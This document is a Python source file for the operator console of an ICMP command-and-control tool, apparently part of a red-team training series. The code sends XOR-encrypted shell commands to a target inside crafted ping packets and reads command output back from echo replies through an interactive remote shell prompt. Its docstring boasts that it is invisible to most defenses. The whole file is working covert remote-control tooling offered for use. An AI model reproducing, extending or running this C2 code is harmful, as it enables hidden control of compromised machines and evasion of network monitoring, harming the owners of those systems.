# c2_frameworks/icmp/operator.py
"""
ICMP C2 Operator Console
Send commands via crafted ping packets
Receive output in ping replies
Zero open ports on target → invisible to 99% of defenses
"""

import os
import socket
import struct
import time
import threading
from datetime import datetime
from typing import Dict, List, Tuple

from .utils import (
    generate_session_id,
    xor_data,
    chunk_payload,
    build_icmp_packet,
    parse_icmp_packet,
    ICMP_ECHO_REQUEST,
    ICMP_ECHO_REPLY
)

class ICMPC2Operator:
    def __init__(self, target_ip: str, xor_key: bytes = b"30DaysRedTeam"):
        self.target_ip = target_ip
        self.xor_key = xor_key
        self.session_id = generate_session_id()
        self.pending_responses: Dict[int, List[bytes]] = {}
        self.response_lock = threading.Lock()

        print(f"[+] ICMP C2 Operator Console")
        print(f"[+] Target     : {target_ip}")
        print(f"[+] Session ID : {self.session_id}")
        print(f"[+] Listening for replies on this host...\n")

    def _checksum(self, data: bytes) -> int:
        if len(data) % 2:
            data += b"\x00"
        s = sum(struct.unpack("!%dH" % (len(data)//2), data))
        s = (s >> 16) + (s & 0xffff)
        s += s >> 16
        return socket.htons(~s & 0xffff)

    def send_command(self, command: str):
        """Encrypt and send command via ICMP echo request"""
        encrypted = xor_data(command.encode(), self.xor_key)
        chunks = chunk_payload(encrypted, max_chunk=1400)

        print(f"[+] Sending command ({len(chunks)} chunk(s)): {command}")

        for i, chunk in enumerate(chunks):
            packet_data = build_icmp_packet(
                icmp_type=ICMP_ECHO_REQUEST,
                seq=1000 + i,
                session_id=self.session_id,
                chunk_id=i,
                total_chunks=len(chunks),
                data=chunk
            )

            # Build full packet with IP + ICMP headers
            ip_header = struct.pack("!BBHHHBBH4s4s",
                0x45, 0, 20 + 8 + len(packet_data), 0, 0, 64,
                socket.IPPROTO_ICMP, 0,
                socket.inet_aton(socket.gethostbyname(socket.gethostname())),
                socket.inet_aton(self.target_ip)
            )
            icmp_header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, 0, 0, 1000 + i)
            packet = ip_header + icmp_header + packet_data
            checksum = self._checksum(packet[20:])
            icmp_header = struct.pack("!BBHHH", ICMP_ECHO_REQUEST, 0, checksum, 0, 1000 + i)
            packet = ip_header + icmp_header + packet_data

            try:
                sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
                sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
                sock.sendto(packet, (self.target_ip, 0))
                sock.close()
                time.sleep(0.8)
            except PermissionError:
                print("[-] Raw sockets require root/admin!")
                return
            except Exception as e:
                print(f"[-] Send error: {e}")

        # Start listener thread
        listener = threading.Thread(target=self.listen_for_reply, daemon=True)
        listener.start()

    def listen_for_reply(self):
        """Listen for ICMP echo replies containing output"""
        print("[*] Listening for output (Ctrl+C to stop)...\n")
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)

        try:
            while True:
                packet, addr = sock.recvfrom(65535)
                if addr[0] != self.target_ip:
                    continue

                ip_header = packet[0:20]
                icmp_header = packet[20:28]
                icmp_data = packet[28:]

                icmp_type = packet[20]
                if icmp_type != ICMP_ECHO_REPLY:
                    continue

                try:
                    session_id, chunk_id, total_chunks, payload = parse_icmp_packet(icmp_data)
                    if session_id != self.session_id:
                        continue

                    decrypted = xor_data(payload, self.xor_key)
                    output = decrypted.decode(errors="ignore")

                    print(f"\nOUTPUT:\n{output}\n")
                    print(f"[+] Session complete.")
                    break

                except Exception as e:
                    continue
        except KeyboardInterrupt:
            print("\n[+] Listener stopped.")
        finally:
            sock.close()

    def interactive(self):
        print("ICMP C2 Shell — type commands, receive output via ping replies\n")
        while True:
            try:
                cmd = input(f"icmp://{self.target_ip}> ").strip()
                if cmd in ["exit", "quit"]:
                    break
                if cmd:
                    self.send_command(cmd)
                    time.sleep(3)
            except KeyboardInterrupt:
                print("\n[+] Exiting.")
                break


# ——— Entry Point ———
if __name__ == "__main__":
    import argparse

    parser = argparse.ArgumentParser(description="ICMP C2 Operator")
    parser.add_argument("target", help="Target IP address")
    args = parser.parse_args()

    operator = ICMPC2Operator(args.target)
    operator.interactive()